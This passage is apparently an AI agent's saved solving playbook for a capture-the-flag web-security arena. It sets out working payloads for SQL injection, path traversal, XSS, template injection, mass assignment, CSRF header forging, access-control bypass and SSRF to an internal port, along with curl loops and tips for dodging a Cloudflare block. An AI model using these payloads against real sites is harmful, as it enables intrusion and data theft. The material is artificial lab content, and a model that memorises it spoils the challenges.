.json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2 crawl, regex `proof_`.\n- **IDOR (D02)** foreign ids in `/api/history`. **SQLi (D03)** `('%..%')` wrapper -> tautologies over `'` `')` `'))`\n  `\"` + `--`/`#` (and quote-balanced, see cross-check). **LFI (D04)** every param whose value has `.`/`/` x `../`*10 +\n  prompt path, absolute, `....//`, `..%2f`, `php://filter`. **Access control (D05)** GET then POST every clue route.\n- **Board noun (D07)**: `/api/messages`+`/messages/{id}` | `/api/postcards`+`/postcards/{id}` -> from openapi/submit `url`.\n- **CSRF (D09)**: route hex, outside mailbox option (`review-NNNN@outside.example.invalid`), token sent or not (both\n  worked). Rule: parse every `<form>` on the clue page; submit the non-current external option cross-site.\n- **Upload (D10)**: route words + skin; \"txt + text/plain\" policy never enforced. Rule: routes by key, preview URL from\n  the upload response's `path`, template syntax from the guide's `<code>`, field `objective`.\n- **SSTI (D11)**: feature `/process-<hex6>`, param `template` (`message`, `q`, `name`, `text`, `input` rendered empty),\n  delimiter `{{..}}` evaluated while `${..}` / `*{..}` came back literal under a \"Spring Boot\" costume; context var\n  `objective`; other names -> Spring-style 500 JSON. TT + Mastery passed with the same handler. Rule: per candidate\n  param send one probe holding every delimiter family with distinct arithmetic (`{{49*1}}|${50*1}|...`), keep the\n  family whose number appears evaluated, then ask it for `objective` (then `proof`, `flag`).\n- **Second-order SQLi (D12)**: winning plant `x' OR '1'='1' -- ` (single) and `zz' OR 1=1 --` (TT), both JSON, every\n  common field at once (`name,q,query,note,label,title,value,filter,search,term,report,...`). Rule: plant the ladder\n  (quote-balanced, paren, `--`-terminated) as JSON then form, re-GET `secondary_route` after EACH plant.\n- **Mass assignment (D13)**: NestJS costume, echo only `display_name`; single and TT both passed with one JSON body\n  holding `display_name` + `role:\"admin\"|\"administrator\"`, `is_admin`, `isAdmin`, `admin`, `roles:[\"admin\"]`,\n  `access_level`, `permissions` (which key bound is unknown -- the echo hides it). State is server-side per target,\n  no cookie. Rule: bind the whole privilege set in one POST, then GET `secondary_route`.\n- **API field/action authz (D14)**: inventory lists `query_parameters [id, fields, action]`, `fields` (single\n  `[title, note]`), `actions` (`[view, export]`), `public_reference`, `sample`; one (field, action) pair skips the\n  check on `protected_reference` (single: `note`+`export`; comma lists and `*` -> `field_action_forbidden`). TT and\n  Mastery (3 targets) passed with the same handler. Rule: param names, fields and actions from the inventory JSON,\n  try every SINGLE field x action on the protected id (sensitive-looking last entries first), then lists.\n- **SSRF internal port (D15)**: `GET feature?url=http://127.0.0.1:8080<secondary_route>` won in single, TT and\n  Mastery (4 targets); `127.0.0.1` / `localhost` on port 80, `:5000`, `:8000`, `:3000`, the public URL ->\n  `fetch_failed`. Param `url` (error text `absolute_url_required`). Rule: path = the 403 `internal_only` route, host\n  ladder `127.0.0.1:8080`, `localhost:8080`, then :80/:5000/:8000/:3000; param from the error word, else `url`.\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]`, a receipt on a board\n  page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login,\n  browser, POST, admin). No concept key -> the prompt's verb names the bug.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside / mounted at /path\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect `<script>fetch('<cb>?nonce=N')</script>` via `?q=`, then GET\n  the callback with same-origin fetch-metadata. \"guestbook\", \"reviewer stops by\", `moderator_data_route` -> D07 stored\n  script fetch(data)->POST receipt; poll. \"plant your session\", `session_hint` -> D08 `?sid=<hint>`.\n- \"obeys whoever asks nicely -- even strangers\", form with hidden `csrf_token` -> D09 cross-site form submit.\n- \"upload form has standards. Low ones\", `upload_shape`/`render_route` -> D10 upload `.html` with `{{objective}}`.\n- \"template engine ... evaluates everything\", \"speak in expressions\", \"incantation\", page \"Rendered message\" with an\n  empty `<pre>` -> D11 SSTI: `GET <feature>?template={{7*7}}` (49), then `?template={{objective}}`.\n- \"plant your question inside the data and come back later\", \"delayed echo\", feature = `post_required`, secondary\n  returns `{\"rows\":[],\"effect\":...}` -> D12 second-order SQLi: POST JSON every field = `x' OR '1'='1' -- `, GET\n  secondary -> `rows` holds the private row.\n- \"the form only asked for your name. But the API binds whatever you hand it\", \"hand it a promotion\", feature\n  `post_required` + secondary 403 `administrator_required` -> D13 mass assignment: POST JSON `display_name` + every\n  privilege key, GET secondary -> `effect: bound_privileged_property` + `evidence`.\n- \"take inventory ... every endpoint, every field, every function\", \"authorization is merely a suggestion\", clues\n  `inventory_route` + `protected_reference` -> D14: GET the inventory, then `feature?id=<protected>&fields=<f>&action=\n  <a>` over every single field x action; one pair returns `effect: api_field_action_authorization_bypassed`.\n- \"the server will fetch anything you point it at\", \"places you can't reach yourself\", \"internal service\", feature\n  400 `absolute_url_required`, secondary 403 `internal_only` -> D15 SSRF: `feature?url=http://127.0.0.1:8080<secondary>`\n  (port 80 = `fetch_failed`, try the port ladder before anything clever).\n- Proof regex hit = landed; an `effect` alone is NOT (D12 prints its effect with empty rows).\n\n## Day by day\n- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery missed it with a\n  one-level crawl). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --` (plain\n  `' OR '1'='1` failed). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt`; 51 s. D05 GET `/dispatch-<hex6>`\n  -> `effect: framework_authorization_bypassed`; 47 s.\n- **D06-D08 (cal. 21)**: D06 reflected XSS, server-judged: reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET\n  `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`/`Mode: cors`/`Dest: empty`, `Referer: <reflected URL>`,\n  `Origin`, `X-Callback-Nonce`; 83 s. D07 stored XSS, real moderator bot: POST a `<script>` that fetches the data\n  route with credentials and POSTs `{evidence}` to the receipt route; poll `/messages/{id}`; 78 s (Mastery receipt\n  >12 s). D08 session fixation: `GET /action-<hex6>?sid=<hint>` -> `Set-Cookie: arena_session=<hint>` -> GET\n  secondary; 116 s; Mastery ~15 min (every solver raced on every target starved the app).\n- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: `/preferences` form; submit `?destination=review-NNNN%40\n  outside.example.invalid` with `Sec-Fetch-Site: cross-site`, `Mode: navigate`, `Dest: document`, foreign Referer ->\n  `/api/preferences` `changed_across_sites:true`; 70 s. D10 upload: POST JSON `{\"filename\":\"note.html\",\"content\":\n  \"<p>{{objective}}</p>\",\"content_type\":\"text/html\"}` -> GET the returned `path`; 58 s. Both TT `solver_incomplete`.\n- **D11-D13 (cal. 23)**: D11 SSTI (\"Spring Boot\"): one probe per param `a${7*7}b*{7*7}c{{7*7}}d` -> only `template`\n  rendered `{{..}}` -> `?template={{objective}}`; 105 s, plugin written pre-submit -> TT first try. D12 second-order\n  SQLi (\"Sinatra\"): POST JSON every field = `x' OR '1'='1' -- ` (form bodies ignored, `saved:true` either way) -> GET\n  secondary -> `rows[]` holds the proof; 83 s. D13 mass assignment (\"NestJS\"): POST JSON `display_name` + role/\n  is_admin/isAdmin/admin/roles/access_level/permissions -> `201` echo shows only `display_name` -> GET secondary ->\n  `bound_privileged_property`; 59 s. D12/D13 TT `solver_incomplete` (no handler yet), hand-solved.\n- **D14 The API Has Opinions (cal. 24)** -- broken function/property-level authz in an API (OWASP API3/API5). Clues\n  `{framework: \"Jakarta Servlet on Tomcat\", feature_route: /execute-<hex6>, inventory_route: /api/inventory,\n  current_role: analyst, protected_reference: <int>}`. Bare feature -> `{\"error\":\"id_fields_action_required\",\n  \"inventory_route\":...}`. Inventory -> `{\"resource\":\"cases\",\"route\":<feature>,\"method\":\"GET\",\"query_parameters\":\n  [\"id\",\"fields\",\"action\"],\"fields\":[\"title\",\"note\"],\"actions\":[\"view\",\"export\"],\"public_reference\":<int>,\"sample\":\n  {...}}`. Public id + title/view -> `{\"id\":..,\"title\":\"Ordinary workspace case\"}`; protected id -> 403\n  `field_action_forbidden` for title/view, title/export, note/view, `title,note`, `*`; `fields=note&action=export` ->\n  `{\"ok\":true,\"effect\":\"api_field_action_authorization_bypassed\",\"evidence\":\"proof_...\"}`. Tools: curl loop over\n  the 2x2 grid (`for f in ...; for a in ...; curl --max-time 20 \"$U<feature>?id=<prot>&fields=$f&action=$a\"`). Single\n  CORRECT 75 s; TT first try (solve 4.2 s), Mastery 3 targets (solve 3.4 s).\n- **D15 Fetch Quest (cal. 24)** -- SSRF. Clues `{framework: \"ASP.NET Core Minimal API\", feature_route: /action-<hex6>,\n  secondary_route: /account-<hex6> | /internal-<hex6>, current_role}` (no concept key). Bare feature -> 400\n  `absolute_url_required`; bare secondary -> 403 `internal_only`. `?url=http://127.0.0.1/<secondary>` and localhost ->\n  `fetch_failed`; `?url=http://127.0.0.1:8080/<secondary>` -> `{\"ok\":true,\"effect\":\"internal_service_reached\",\n  \"evidence\":\"proof_...\"}` (:5000/:8000/:3000, public URL, example.com all `fetch_failed`). Single CORRECT 75 s (3rd\n  request batch); TT `solver_incomplete` 41 s (plugin not yet on disk), live worker hit it with the same 4-URL loop;\n  Mastery 4 targets (first 4-target Mastery) solve 3.2 s. No `file://`, redirect or IP-encoding tricks needed.\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12, proof in `rows[]`),\n  `bound_privileged_property` (D13, proof in `evidence`), `api_field_action_authorization_bypassed` (D14),\n  `internal_service_reached` (D15). D09 `changed_across_sites:true` + `evidence`; D10, D11 proof\n  in rendered HTML; D07 in a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Shipping a new day without its class handler: D09, D10, D12, D13, D15 TT all `solver_incomplete`. Write the\n  `lib/web/handlers/dayNN_*.py` plugin (KEY_MAP + HANDLERS) BEFORE the single submit, like D11 did.\n- Treating `effect` as success: D12's reader prints its effect with `rows: []`. Success = proof regex.\n- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.\n- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.\n- SSRF to the default port: D15's internal service listens on 8080; `http://127.0.0.1/<route>` = `fetch_failed`,\n  which reads like \"blocked\" but is just the wrong port. Port ladder first.\n- Combining fields (`title,note`, `*`) in D14 was forbidden; only the single bypassed pair works -- enumerate pairs.\n- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\"; `{{objective}}` worked.\n- Choosing routes by the WORD in a clue value -- words are re-dealt within a day (D12 result->internal, D13\n  audit->internal); use clue keys / openapi. Routing by prompt keywords in Mastery (earlier-day targets get today's\n  prompt). One-level crawls (D01 proof sits one link below the index). Solvers importing each other's `fallback()`.\n- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Trusting the app's stated policy (\"txt only\", \"token required\"): D09/D10 rules were decorative.\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n","userModified":false},"tool_result_meta":[{"id":"toolu_01K4uAh8tZzB2nJePdJiPyDF","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
